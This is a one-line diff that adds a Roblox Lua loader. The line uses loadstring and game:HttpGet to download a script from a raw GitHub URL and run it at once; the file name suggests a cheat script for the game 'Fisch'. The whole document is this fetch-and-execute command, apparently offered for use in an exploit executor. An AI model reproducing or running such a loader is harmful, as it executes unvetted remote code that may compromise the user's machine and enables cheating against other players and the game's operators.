@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/fisch-fischfright-spam7-2hjskkmzmdneki.lua"))()
